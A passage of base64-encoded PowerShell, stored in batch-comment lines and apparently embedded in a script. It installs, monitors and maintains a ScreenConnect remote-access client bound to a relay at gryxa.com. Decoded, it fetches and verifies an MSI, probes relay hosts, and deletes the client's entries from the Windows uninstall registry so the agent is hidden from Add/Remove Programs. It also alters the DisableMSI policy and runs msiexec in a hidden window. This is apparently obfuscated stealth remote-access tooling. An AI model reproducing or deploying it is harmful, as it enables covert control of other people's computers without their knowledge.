::ICAgICAgICR3YW50ID0gW3N0cmluZ10kZG9jLmZpbGVzLiRuYW1lDQogICAgICAg
::ICAgICBpZiAoLW5vdCAkd2FudCkgeyByZXR1cm4gIm5vdC1pbi1tYW5pZmVzdDok
::bmFtZSIgfQ0KICAgICAgICAgICAgJHNoYSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5
::cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpDQogICAgICAgICAgICAkZnMgPSBb
::SU8uRmlsZV06Ok9wZW5SZWFkKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRw
::YXRoKS5QYXRoKQ0KICAgICAgICAgICAgdHJ5IHsgJGhhc2ggPSAoW0JpdENvbnZl
::cnRlcl06OlRvU3RyaW5nKCRzaGEuQ29tcHV0ZUhhc2goJGZzKSkpLlJlcGxhY2Uo
::Jy0nLCAnJykuVG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGZpbmFsbHkgeyAkZnMu
::Q2xvc2UoKSB9DQogICAgICAgICAgICBpZiAoJGhhc2ggLW5lICR3YW50LlRvTG93
::ZXIoKSkgeyByZXR1cm4gImhhc2gtbWlzbWF0Y2g6JG5hbWUiIH0NCiAgICAgICAg
::fQ0KICAgICAgICByZXR1cm4gJ29rJw0KICAgIH0gY2F0Y2ggeyByZXR1cm4gImVy
::cm9yOiQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiB9DQp9DQoNCmZ1bmN0aW9uIEdl
::dC1Hcnl4YUZwIHsNCiAgICAkZnAgPSAkc2NyaXB0OkdyeXhhRGVmYXVsdEZwDQog
::ICAgJHAgPSBHZXQtR3J5eGFDZmdQYXRoDQogICAgaWYgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJHApIHsNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRo
::ICRwIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmpl
::Y3Qgew0KICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXkNVUlJFTlRfRlA9KFsw
::LTlhLWZBLUZdezE2fSlccyokJykgeyAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2Vy
::KCkgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZnANCn0NCg0KZnVu
::Y3Rpb24gU2V0LUdyeXhhRnAoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBp
::ZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuIH0NCiAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsgTmV3LUl0ZW0gLUl0
::ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBPdXQtTnVs
::bCB9DQogICAgQCgNCiAgICAgICAgIkNVUlJFTlRfRlA9JCgkRmluZ2VycHJpbnQu
::VG9Mb3dlcigpKSIsDQogICAgICAgICJSRUxBWT0kKCRzY3JpcHQ6R3J5eGFSZWxh
::eUhvc3QpIiwNCiAgICAgICAgIlVJPSQoJHNjcmlwdDpHcnl4YVVpSG9zdCkiLA0K
::ICAgICAgICAiTVNJVVJMPSQoJHNjcmlwdDpHcnl4YU1zaVVybCkiLA0KICAgICAg
::ICAiVVBEQVRFRD0kKChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJp
::bmcoJ28nKSkiDQogICAgKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoR2V0
::LUdyeXhhQ2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0KfQ0KDQojIEwz
::OTogbmV2ZXIgYWRvcHQgYSBmb3JlaWduIFNDIGFzIEdyeXhhLiBLZWVwZXIgb25s
::eSBpZiBGUCBpcyBFeHBlY3RlZEZwIE9SDQojIEltYWdlUGF0aC9jbWRsaW5lIGNv
::bnRhaW5zIGdyeXhhLmNvbSAob3IgY2ZnIFJFTEFZIGhvc3QpLiBEbyBOT1QgdHJ1
::c3QgY2ZnIGFsb25lIOKAlA0KIyBhIHBvaXNvbmVkIENVUlJFTlRfRlAgd291bGQg
::c2VsZi13aGl0ZWxpc3QgZm9yZXZlci4NCmZ1bmN0aW9uIFRlc3QtSXNHcnl4YUZw
::KFtzdHJpbmddJEZwKSB7DQogICAgaWYgKC1ub3QgJEZwKSB7IHJldHVybiAkZmFs
::c2UgfQ0KICAgICRmcCA9ICRGcC5Ub0xvd2VyKCkNCiAgICBpZiAoJGZwIC1pbiAk
::c2NyaXB0OlNldnJ6S2VlcCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICBpZiAoJHNj
::cmlwdDpHcnl4YUV4cGVjdGVkRnAgLWFuZCAkZnAgLWVxICRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwLlRvTG93ZXIoKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgICRuYW1l
::ID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIg0KICAgICRpbWcgPSBbc3Ry
::aW5nXShHZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRy
::b2xTZXRcU2VydmljZXNcJG5hbWUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlKS5JbWFnZVBhdGgNCiAgICAkcmVsYXkgPSAkc2NyaXB0OkdyeXhhUmVsYXlI
::b3N0DQogICAgaWYgKCRpbWcgLWFuZCAoJGltZyAtbWF0Y2ggJyg/aSlncnl4YVwu
::Y29tJyAtb3IgKCRyZWxheSAtYW5kICRpbWcgLWxpa2UgIiokcmVsYXkqIikpKSB7
::IHJldHVybiAkdHJ1ZSB9DQogICAgZm9yZWFjaCAoJHByb2MgaW4gKEdldC1DaW1J
::bnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUgbGlrZSAnU2NyZWVu
::Q29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsNCiAg
::ICAgICAgJGJsb2IgPSAiJChbc3RyaW5nXSRwcm9jLkV4ZWN1dGFibGVQYXRoKSAk
::KFtzdHJpbmddJHByb2MuQ29tbWFuZExpbmUpIg0KICAgICAgICBpZiAoJGJsb2Ig
::LWxpa2UgIiokZnAqIiAtYW5kICgkYmxvYiAtbWF0Y2ggJyg/aSlncnl4YVwuY29t
::JyAtb3IgKCRyZWxheSAtYW5kICRibG9iIC1saWtlICIqJHJlbGF5KiIpKSkgew0K
::ICAgICAgICAgICAgcmV0dXJuICR0cnVlDQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICRmYWxzZQ0KfQ0KDQpmdW5jdGlvbiBHZXQtS2VlcEZpbmdlcnByaW50
::cyB7DQogICAgJHNldCA9IE5ldy1PYmplY3QgJ1N5c3RlbS5Db2xsZWN0aW9ucy5H
::ZW5lcmljLkhhc2hTZXRbc3RyaW5nXScgKFtTdHJpbmdDb21wYXJlcl06Ok9yZGlu
::YWxJZ25vcmVDYXNlKQ0KICAgIGZvcmVhY2ggKCRzIGluIChHZXQtU2V2cnpLZWVw
::KSkgeyBbdm9pZF0kc2V0LkFkZCgkcykgfQ0KICAgIGlmICgkc2NyaXB0OkdyeXhh
::RXhwZWN0ZWRGcCkgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0OkdyeXhhRXhwZWN0
::ZWRGcCkgfQ0KICAgICRjZmcgPSBHZXQtR3J5eGFGcA0KICAgIGlmICgkY2ZnIC1h
::bmQgKFRlc3QtSXNHcnl4YUZwICRjZmcpKSB7IFt2b2lkXSRzZXQuQWRkKCRjZmcp
::IH0NCiAgICBlbHNlaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB7IFt2b2lk
::XSRzZXQuQWRkKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB9DQogICAgZWxzZSB7
::IFt2b2lkXSRzZXQuQWRkKCRzY3JpcHQ6R3J5eGFEZWZhdWx0RnApIH0NCiAgICBm
::b3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVj
::dCBDbGllbnQqJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsNCiAg
::ICAgICAgaWYgKCRzdmMuU3RhdHVzIC1ub3RpbiBAKCdSdW5uaW5nJywnU3RhcnRQ
::ZW5kaW5nJywnQ29udGludWVQZW5kaW5nJykpIHsgY29udGludWUgfQ0KICAgICAg
::ICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgew0K
::ICAgICAgICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAg
::ICAgICBpZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyBjb250aW51ZSB9
::DQogICAgICAgICAgICBpZiAoVGVzdC1Jc0dyeXhhRnAgJGZwKSB7IFt2b2lkXSRz
::ZXQuQWRkKCRmcCk7IFNldC1Hcnl4YUZwICRmcCB9DQogICAgICAgIH0NCiAgICB9
::DQogICAgcmV0dXJuIEAoJHNldCkNCn0NCg0KZnVuY3Rpb24gVGVzdC1UY3BIb3N0
::UG9ydChbc3RyaW5nXSRIb3N0TmFtZSwgW2ludF0kUG9ydCA9IDQ0MywgW2ludF0k
::VGltZW91dE1zID0gODAwMCkgew0KICAgIGlmICgtbm90ICRIb3N0TmFtZSkgeyBy
::ZXR1cm4gJGZhbHNlIH0NCiAgICAkYyA9ICRudWxsDQogICAgdHJ5IHsNCiAgICAg
::ICAgJGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UY3BDbGllbnQN
::CiAgICAgICAgJGlhciA9ICRjLkJlZ2luQ29ubmVjdCgkSG9zdE5hbWUsICRQb3J0
::LCAkbnVsbCwgJG51bGwpDQogICAgICAgIGlmICgtbm90ICRpYXIuQXN5bmNXYWl0
::SGFuZGxlLldhaXRPbmUoJFRpbWVvdXRNcywgJGZhbHNlKSkgeyB0cnkgeyAkYy5D
::bG9zZSgpIH0gY2F0Y2gge307IHJldHVybiAkZmFsc2UgfQ0KICAgICAgICAkYy5F
::bmRDb25uZWN0KCRpYXIpOyByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsgcmV0
::dXJuICRmYWxzZSB9IGZpbmFsbHkgeyBpZiAoJGMpIHsgdHJ5IHsgJGMuQ2xvc2Uo
::KSB9IGNhdGNoIHt9IH0gfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtTXNpUHJvcGVydHko
::W3N0cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kUHJvcGVydHlOYW1lKSB7DQogICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1zaVBhdGgpKSB7IHJl
::dHVybiAkbnVsbCB9DQogICAgdHJ5IHsNCiAgICAgICAgJGkgPSBOZXctT2JqZWN0
::IC1Db21PYmplY3QgV2luZG93c0luc3RhbGxlci5JbnN0YWxsZXINCiAgICAgICAg
::JGRiID0gJGkuT3BlbkRhdGFiYXNlKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRo
::ICRNc2lQYXRoKS5QYXRoLCAwKQ0KICAgICAgICAkdiA9ICRkYi5PcGVuVmlldygi
::U0VMRUNUIGBWYWx1ZWAgRlJPTSBgUHJvcGVydHlgIFdIRVJFIGBQcm9wZXJ0eWA9
::JyRQcm9wZXJ0eU5hbWUnIikNCiAgICAgICAgJHYuRXhlY3V0ZSgpIHwgT3V0LU51
::bGwNCiAgICAgICAgJHIgPSAkdi5GZXRjaCgpDQogICAgICAgIGlmICgtbm90ICRy
::KSB7IHJldHVybiAkbnVsbCB9DQogICAgICAgIHJldHVybiBbc3RyaW5nXSRyLlN0
::cmluZ0RhdGEoMSkNCiAgICB9IGNhdGNoIHsgcmV0dXJuICRudWxsIH0NCn0NCg0K
::ZnVuY3Rpb24gR2V0LUZwRnJvbVByb2R1Y3ROYW1lKFtzdHJpbmddJFByb2R1Y3RO
::YW1lKSB7DQogICAgaWYgKCRQcm9kdWN0TmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZB
::LUZdezE2fSlcKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQog
::ICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0aW9uIEZpbmQtUHJvZHVjdEd1aWQo
::W3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAkbmFtZSA9ICJTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICBmb3JlYWNoICgkcm9vdCBp
::biAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7DQogICAgICAgIGlmICgtbm90IChU
::ZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgZm9yZWFjaCAo
::JGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZSkpIHsNCiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3Bl
::cnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5E
::aXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYgKCRkbiAtYW5kICgkZG4gLWllcSAk
::bmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9JykpIHsgcmV0
::dXJuICRrZXkuUFNDaGlsZE5hbWUgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJl
::dHVybiAkbnVsbA0KfQ0KDQpmdW5jdGlvbiBUZXN0LVNjUnVubmluZyhbc3RyaW5n
::XSRGaW5nZXJwcmludCkgew0KICAgICMgTDQzOiBTdGFydFBlbmRpbmcvQ29udGlu
::dWVQZW5kaW5nID0gbGl2ZSBzZXNzaW9uIGluIHByb2dyZXNzIOKAlCBuZXZlciB0
::cmVhdCBhcyBkb3duDQogICAgIyAodGhhdCByYWNlIGNhdXNlZCBtc2lleGVjIC94
::IGR1cmluZyBjb25uZWN0IOKGkiBHdWVzdCBkcm9wKS4NCiAgICBpZiAoLW5vdCAk
::RmluZ2VycHJpbnQpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJHN2YyA9IEdldC1T
::ZXJ2aWNlIC1OYW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50
::KSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICByZXR1cm4gW2Jv
::b2xdKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtaW4gQCgnUnVubmluZycsICdTdGFy
::dFBlbmRpbmcnLCAnQ29udGludWVQZW5kaW5nJykpDQp9DQoNCmZ1bmN0aW9uIFRl
::c3QtU2NTZXJ2aWNlRXhpc3RzKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAg
::aWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIHJl
::dHVybiBbYm9vbF0oR2V0LVNlcnZpY2UgLU5hbWUgIlNjcmVlbkNvbm5lY3QgQ2xp
::ZW50ICgkRmluZ2VycHJpbnQpIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSkNCn0NCg0KZnVuY3Rpb24gVGVzdC1TY0Rpcihbc3RyaW5nXSRGaW5nZXJwcmlu
::dCkgew0KICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9LCAkZW52OlByb2dyYW1GaWxlcykpIHsNCiAgICAgICAgaWYgKFRlc3Qt
::UGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVj
::dCBDbGllbnQgKCRGaW5nZXJwcmludCkiKSkgeyByZXR1cm4gJHRydWUgfQ0KICAg
::IH0NCiAgICByZXR1cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIEZpbmQtUnVubmlu
::Z0dyeXhhRnAgew0KICAgICRjZmcgPSBHZXQtR3J5eGFGcA0KICAgIGlmICgkY2Zn
::IC1hbmQgKFRlc3QtU2NSdW5uaW5nICRjZmcpIC1hbmQgKFRlc3QtSXNHcnl4YUZw
::ICRjZmcpKSB7IHJldHVybiAkY2ZnIH0NCiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4
::cGVjdGVkRnAgLWFuZCAoVGVzdC1TY1J1bm5pbmcgJHNjcmlwdDpHcnl4YUV4cGVj
::dGVkRnApKSB7IHJldHVybiAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2Vy
::KCkgfQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdT
::Y3JlZW5Db25uZWN0IENsaWVudConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlKSkgew0KICAgICAgICBpZiAoJHN2Yy5TdGF0dXMgLW5vdGluIEAoJ1J1bm5p
::bmcnLCdTdGFydFBlbmRpbmcnLCdDb250aW51ZVBlbmRpbmcnKSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsx
::Nn0pXCknKSB7DQogICAgICAgICAgICAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2Vy
::KCkNCiAgICAgICAgICAgIGlmICgkZnAgLWluICRzY3JpcHQ6U2V2cnpLZWVwKSB7
::IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIGlmIChUZXN0LUlzR3J5eGFGcCAkZnAp
::IHsgcmV0dXJuICRmcCB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRu
::dWxsDQp9DQoNCmZ1bmN0aW9uIFRlc3QtQW55Tm9uU2V2cnpTY1J1bm5pbmcgeyBy
::ZXR1cm4gW2Jvb2xdKEZpbmQtUnVubmluZ0dyeXhhRnApIH0NCg0KZnVuY3Rpb24g
::R2V0LUdyeXhhU3RhdHVzKFtzdHJpbmddJGZwKSB7DQogICAgJHN2YyA9IEdldC1T
::ZXJ2aWNlIC1OYW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJGZwKSIgLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAjIEwzOTogU3RhcnRQZW5kaW5n
::L0NvbnRpbnVlUGVuZGluZyA9IGhlYWx0aHktaW4tcHJvZ3Jlc3MgKG5vdCBCUk9L
::RU4pDQogICAgJHJ1bm5pbmcgPSBbYm9vbF0oJHN2YyAtYW5kICRzdmMuU3RhdHVz
::IC1pbiBAKCdSdW5uaW5nJywnU3RhcnRQZW5kaW5nJywnQ29udGludWVQZW5kaW5n
::JykpDQogICAgJGRpciA9IFRlc3QtU2NEaXIgJGZwDQogICAgJGd1aWQgPSBGaW5k
::LVByb2R1Y3RHdWlkICRmcA0KICAgICR0Y3BSID0gJHRydWU7ICR0Y3BVID0gJHRy
::dWUNCiAgICAjIHNraXAgVENQIG9uIGhvdCBwYXRoIHdoZW4gYWxyZWFkeSBydW5u
::aW5nIHVubGVzcyBEZWVwIChEZWVwIHNldHMgRXh0cmE9ZGVlcC10Y3AgdmlhIGNh
::bGxlcikNCiAgICBpZiAoJERlZXAgLW9yIC1ub3QgJHJ1bm5pbmcpIHsNCiAgICAg
::ICAgJHRjcFIgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFSZWxheUhv
::c3QgNDQzDQogICAgICAgICR0Y3BVID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0
::OkdyeXhhVWlIb3N0IDQ0Mw0KICAgIH0NCiAgICBpZiAoJHJ1bm5pbmcpIHsgcmV0
::dXJuICJIRUFMVEhZfCRmcHxydW5uaW5nPTF8cmVsYXk9JHRjcFJ8dWk9JHRjcFUi
::IH0NCiAgICBpZiAoJHN2YyAtYW5kICRkaXIpIHsgcmV0dXJuICJCUk9LRU58JGZw
::fHN2Yy1wcmVzZW50LXN0b3BwZWR8cmVsYXk9JHRjcFJ8dWk9JHRjcFUiIH0NCiAg
::ICBpZiAoLW5vdCAkc3ZjIC1hbmQgKCRkaXIgLW9yICRndWlkKSkgeyByZXR1cm4g
::IlNUVUNLfCRmcHxyZWdpc3RlcmVkLW5vLXNlcnZpY2V8cmVsYXk9JHRjcFJ8dWk9
::JHRjcFUiIH0NCiAgICByZXR1cm4gIkFCU0VOVHwkZnB8bm90LWluc3RhbGxlZHxy
::ZWxheT0kdGNwUnx1aT0kdGNwVSINCn0NCg0KZnVuY3Rpb24gVGVzdC1Hcnl4YUhl
::YWx0aCB7IHJldHVybiAoR2V0LUdyeXhhU3RhdHVzIChHZXQtR3J5eGFGcCkpIH0N
::Cg0KZnVuY3Rpb24gQ2xlYXItR3J5eGFBcnAoW3N0cmluZ10kZnApIHsNCiAgICAk
::Z3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJGZwDQogICAgZm9yZWFjaCAoJHIgaW4g
::QCgnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNp
::b25cVW5pbnN0YWxsJywNCiAgICAgICAgICAgICAgICAgICAgICdIS0xNOlxTT0ZU
::V0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lv
::blxVbmluc3RhbGwnKSkgew0KICAgICAgICBpZiAoJGd1aWQgLWFuZCAoVGVzdC1Q
::YXRoICIkclwkZ3VpZCIpKSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAiJHJc
::JGd1aWQiIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSB9DQogICAgICAgIEdldC1DaGlsZEl0ZW0gJHIgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAk
::ZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoJGRu
::IC1tYXRjaCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgkKFtyZWdleF06OkVzY2Fw
::ZSgkZnApKVwpIikgew0KICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRl
::cmFsUGF0aCAkXy5QU1BhdGggLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9
::DQp9DQoNCmZ1bmN0aW9uIFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50KFtzdHJpbmdd
::JEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJl
::dHVybiAnbm8tZnAnIH0NCiAgICAjIEw0NTogSEFORFMtT0ZGIOKAlCBuZXZlciB1
::bmluc3RhbGwvc3RvcC9kZWxldGUgQU5ZIFNjcmVlbkNvbm5lY3QNCiAgICByZXR1
::cm4gJ3JlZnVzZWQtaGFuZHMtb2ZmLXNjJw0KICAgIGlmIChUZXN0LVNjUnVubmlu
::ZyAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdyZWZ1c2VkLXJ1bm5pbmcnIH0NCiAg
::ICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIN
::CiAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJEZpbmdlcnByaW50DQogICAg
::JiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3Nv
::ZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91
::dC1OdWxsDQogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2ll
::c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL3Qg
::UkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1OdWxsDQogICAgaWYgKCRndWlk
::KSB7IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3gg
::JGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2Fp
::dCAtV2luZG93U3R5bGUgSGlkZGVuOyBTdGFydC1TbGVlcCAtU2Vjb25kcyA2IH0N
::CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiAgICBpZiAoJHN2YykgeyAmIHNjLmV4ZSBzdG9w
::ICRuYW1lIDI+JjEgfCBPdXQtTnVsbDsgJiBzYy5leGUgZGVsZXRlICRuYW1lIDI+
::JjEgfCBPdXQtTnVsbDsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMiB9DQogICAgQ2xl
::YXItR3J5eGFBcnAgJEZpbmdlcnByaW50DQogICAgZm9yZWFjaCAoJGJhc2UgaW4g
::QCgke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkg
::ew0KICAgICAgICAkZCA9IEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgICAgIGlmIChUZXN0LVBhdGggLUxp
::dGVyYWxQYXRoICRkKSB7ICYgdGFrZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYx
::IHwgT3V0LU51bGw7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJz
::ZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KICAgIH0N
::CiAgICByZXR1cm4gJ3JlbW92ZWQnDQp9DQoNCmZ1bmN0aW9uIFRlc3QtTXNpUGFj
::a2FnZShbc3RyaW5nXSRQYXRoLCBbc3RyaW5nXSRFeHBlY3RlZEZwID0gJycpIHsN
::CiAgICAjIFNoYXJlZCBPTEUtbWFnaWMgKyBvcHRpb25hbCBQcm9kdWN0TmFtZSBG
::UCBnYXRlIChMMzcvTDM5KS4gVXNlZCBieSBHcnl4YSArIHNldnJ6IGluc3RhbGwg
::cGF0aHMuDQogICAgaWYgKC1ub3QgJFBhdGggLW9yIC1ub3QgKFRlc3QtUGF0aCAt
::TGl0ZXJhbFBhdGggJFBhdGgpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIGlmICgo
::R2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRQYXRoKS5MZW5ndGggLWx0IDUwMDAwMCkg
::eyByZXR1cm4gJGZhbHNlIH0NCiAgICB0cnkgew0KICAgICAgICAkZnMgPSBbU3lz
::dGVtLklPLkZpbGVdOjpPcGVuUmVhZCgoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0
::aCAkUGF0aCkuUGF0aCkNCiAgICAgICAgJG1hZ2ljID0gTmV3LU9iamVjdCBieXRl
::W10gNA0KICAgICAgICAkbnVsbCA9ICRmcy5SZWFkKCRtYWdpYywgMCwgNCkNCiAg
::ICAgICAgJGZzLkNsb3NlKCkNCiAgICAgICAgaWYgKC1ub3QgKCRtYWdpY1swXSAt
::ZXEgMHhEMCAtYW5kICRtYWdpY1sxXSAtZXEgMHhDRiAtYW5kICRtYWdpY1syXSAt
::ZXEgMHgxMSAtYW5kICRtYWdpY1szXSAtZXEgMHhFMCkpIHsgcmV0dXJuICRmYWxz
::ZSB9DQogICAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfQ0KICAgIGlmICgkRXhw
::ZWN0ZWRGcCkgew0KICAgICAgICAkZnAgPSBHZXQtRnBGcm9tUHJvZHVjdE5hbWUg
::KEdldC1Nc2lQcm9wZXJ0eSAkUGF0aCAnUHJvZHVjdE5hbWUnKQ0KICAgICAgICBp
::ZiAoLW5vdCAkZnAgLW9yICRmcCAtbmUgJEV4cGVjdGVkRnAuVG9Mb3dlcigpKSB7
::IHJldHVybiAkZmFsc2UgfQ0KICAgIH0NCiAgICByZXR1cm4gJHRydWUNCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhTXNpIHsNCiAgICAkbXNpID0gSm9pbi1QYXRoICRX
::b3JrRGlyICdwa2dfZ3J5eGEubXNpJw0KICAgICMgV2hlbiBhbiBGUCBpcyBwaW5u
::ZWQsIHRoZSBjYWNoZWQgTVNJIG11c3QgbWF0Y2ggaXQ7IG90aGVyd2lzZSByZWZl
::dGNoLg0KICAgIGlmICgoVGVzdC1QYXRoICRtc2kpIC1hbmQgKChHZXQtSXRlbSAk
::bXNpKS5MZW5ndGggLWd0IDEwMDAwMDApKSB7DQogICAgICAgIGlmICgtbm90ICRz
::Y3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB7IHJldHVybiAkbXNpIH0NCiAgICAgICAg
::aWYgKFRlc3QtTXNpUGFja2FnZSAkbXNpICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZw
